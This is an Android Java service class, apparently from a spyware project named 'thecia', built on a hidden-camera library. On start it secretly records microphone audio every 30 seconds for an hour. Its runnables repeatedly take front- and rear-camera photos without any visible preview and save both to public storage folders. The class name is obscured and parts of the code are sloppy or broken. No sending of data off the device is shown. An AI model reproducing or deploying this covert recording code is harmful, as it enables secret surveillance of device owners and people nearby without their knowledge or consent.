package start.thecia.Services;

import android.app.Notification;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;

import android.util.Log;
import android.widget.Toast;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.CameraError;
import com.androidhiddencamera.HiddenCameraService;
import com.androidhiddencamera.HiddenCameraUtils;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;
import com.github.piasy.rxandroidaudio.AudioRecorder;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;


import static java.util.concurrent.TimeUnit.SECONDS;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

/**
 * Created by temp on 4/10/2017.
 */
public class c extends HiddenCameraService implements Runnable{
    Handler S=new Handler();
    Handler a = new Handler();
    File imageFile;
    Thread B;
    Thread mThread;
    // stopSelf();
    //picgettter();

    private final int serviceId=0;
    // Unique Identification Number for the Notification.
    // We use it on Notification start, and to cancel it.
//    private int NOTIFICATION = R.string.local_service_started;
    private Notification mNM=new Notification();
    Timer timer=new Timer();
    AudioRecorder  mAudioRecorder;
    CameraConfig cameraConfig;
    boolean isBusy=false;
    final Runnable r=new Runnable() {
        @Override
        public void run() {
            stopCamera();
            final   CameraConfig cameraConfig1 = new CameraConfig()
                    .getBuilder(getApplicationContext())
                    .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                    .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                    .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                    .build();
            startCamera(cameraConfig1);
            takePicture();
            Thread thread=new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    a.postDelayed(m,3000);
                }});
            thread.start();//thread.run();
        }};

    Runnable m = new Runnable() {

        @Override
        public void run() {
            stopCamera();
            CameraConfig cameraConfig = getRearConfig();
            startCamera(cameraConfig);
            takePicture();
            Log.i("REAR", "");
            cameraConfig = null;
            a.postDelayed(r,3000);}};
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


                BeeperControl a=new BeeperControl();
                a.beepForAnHour();
        Log.i("running","recording");
                // startServicefromNonActivity();

                //Open settings to grant permission for "Draw other apps".
              HiddenCameraUtils.openDrawOverPermissionSetting(this);

        return START_NOT_STICKY;}

    public CameraConfig getRearConfig() throws RuntimeException {
        try {
            CameraConfig cameraConfig = new CameraConfig()
                    .getBuilder(getApplicationContext())
                    .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
                    .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                    .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                    .build();
            return cameraConfig;
        } catch (RuntimeException e) {
            if (!e.equals(null)) {
                stopCamera();
                Log.i("Camera isn't null", "");
                getRearConfig();
            }
        }
        return null;
    }
    public void recordingNow(){
        Log.i("running","recording");   isBusy=true;   mAudioRecorder = AudioRecorder.getInstance();

        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss",Locale.getDefault());
        File  mAudioFile = openFileFor();
        mAudioRecorder.prepareRecord(MediaRecorder.AudioSource.MIC,
                MediaRecorder.OutputFormat.MPEG_4, MediaRecorder.AudioEncoder.AAC,
                mAudioFile);

        mAudioRecorder.startRecord();
    }

    void Stopping(){mAudioRecorder.stopRecord();isBusy=false;   Log.i("running","stopped"); recordingNow();}
    public void recordIt(){

        if(!isBusy){
            recordingNow();}if(isBusy){Stopping();}else{recordingNow();}}
    private File openFileFor() {
        File imageDirectory = null;

            imageDirectory = new File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "aLog");
            if (!imageDirectory.exists() && !imageDirectory.mkdirs()) {
                imageDirectory = null;
            } else {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss",
                        Locale.getDefault());

                return new File(imageDirectory.getPath() +
                        File.separator +
                        dateFormat.format(new Date()) + ".file.mp4");
            }

        return null;
    }
    @Override
    public void onDestroy(){
    }
    @Override
    public void run() {
        Thread aThread=new Thread(c.this);
        aThread.start();
    }

    private class BeeperControl {
        private final ScheduledExecutorService scheduler =
                Executors.newScheduledThreadPool(1);

        public void beepForAnHour() {
            final Runnable beeper = new Runnable() {
                public void run() {  Log.i("running","beep for a hr");recordIt(); }
            };
            final ScheduledFuture<?> beeperHandle =
                    scheduler.scheduleAtFixedRate(beeper, 30, 30,SECONDS);
            scheduler.schedule(new Runnable() {
                public void run() { beeperHandle.cancel(true); }
            }, 60 * 60, SECONDS);
        }
    }

    @Override
    public void onImageCapture(@NonNull final File imageFile)
    {
        B=new Thread(new Runnable(){
            @Override
            public void run(){
                File file = openFileForImage();
                BitmapFactory.Options options = new BitmapFactory.Options();
                options.inPreferredConfig = Bitmap.Config.RGB_565;
                Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);

                Log.d("Image capture", imageFile.length() + "");
                if (bitmap != null) {
                    FileOutputStream outStream = null;
                    try {
                        outStream = new FileOutputStream(file);
                        if (!bitmap.compress(Bitmap.CompressFormat.JPEG, 100, outStream)) {
                            Log.i("", "Unable to save image to file.");

                        } else {
                            Log.i("save image to file.", file.getPath());

                        }
                        outStream.close();

                    }
                    catch (Exception e) {
                    }
                }}});//end of thread
        B.start();//call the thread;
    }



    private File openFileForImage() {
        File imageDirectory = null;
        String storageState = Environment.getExternalStorageState();
        if (storageState.equals(Environment.MEDIA_MOUNTED)) {
            imageDirectory = new File(


                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                    "acamera");
            if (!imageDirectory.exists() && !imageDirectory.mkdirs()) {
                imageDirectory = null;
            } else {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss",
                        Locale.getDefault());

                return new File(imageDirectory.getPath() +
                        File.separator + "image_" +
                        dateFormat.format(new Date()) + ".png");
            }
        }
        return null;
    }
    public void checkAccess()throws RuntimeException{
        try{


        }catch(RuntimeException e){}

    }
    @Override
    public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
        switch (errorCode) {
            case CameraError.ERROR_CAMERA_OPEN_FAILED:
                //Camera open failed. Probably because another application
                //is using the camera
                if(cameraConfig==null){}
                Toast.makeText(this, "Cannot open camera.", Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE:
                //camera permission is not available
                //Ask for the camra permission before initializing it.
                Toast.makeText(this, "Camera permission not available.", Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION:
                //Display information dialog to the user with steps to grant "Draw over other app"
                //permission for the app.
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA:
                Toast.makeText(this, "Your device does not have front camera.", Toast.LENGTH_LONG).show();
                break;
        }

        ;
    }




    final  Runnable j=new Runnable() {
        @Override
        public void run() {
            stopCamera();
            final   CameraConfig cameraConfig1 = new CameraConfig()
                    .getBuilder(getApplicationContext())
                    .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                    .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                    .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                    .build();
            startCamera(cameraConfig1);
            takePicture();
            final Thread D = new Thread(new Runnable() {
                @Override
                public void run() {
                    Log.i("front","");
                    B.run();}
            });D.run();;

            try {
                a.postDelayed(r,15000);
                Thread.sleep(20000);
                a.postDelayed(j,7000);;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }};


}